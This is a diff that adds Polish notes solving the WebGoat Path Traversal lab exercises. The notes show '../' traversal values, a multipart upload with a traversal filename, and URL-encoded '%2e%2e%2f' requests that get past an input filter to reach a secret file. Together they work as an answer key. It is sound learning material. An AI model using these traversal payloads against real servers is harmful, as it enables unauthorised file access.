@@ -1,0 +1,16 @@
+2. Modyfikujemy wartość test o ../test
+
+3. Modyfikujemy wartość test o ..././test
+
+4. Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../test.txt"
+   Content-Type: application/text
+
+5. Można zmodyfikować zapytanie GET GET /WebGoat/PathTraversal/random-picture?id=2.jpg HTTP/1.1
+W ten sposób weryfikujemy w respone automatyczne dodawanie .jpg do każdego zapytania.
+Sprawdzamy GET /WebGoat/PathTraversal/random-picture?id=../ HTTP/1.1. Niestety otrzymujemy komunikat
+Illegal characters are not allowed in the query params. Spróbujmy kodowania URL, 
+GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f HTTP/1.1, w tym wypadku
+Aplikacja internetowa zwróciła listę katalogu / PathTraversal. W doku prób rozwiązanie to
+GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret HTTP/1.1
+Otrzymujemy informację zwrotną You found it submit the SHA-512 hash of your username as answer
+Kodujemy w SHA512 swoją nazwę i zrobione
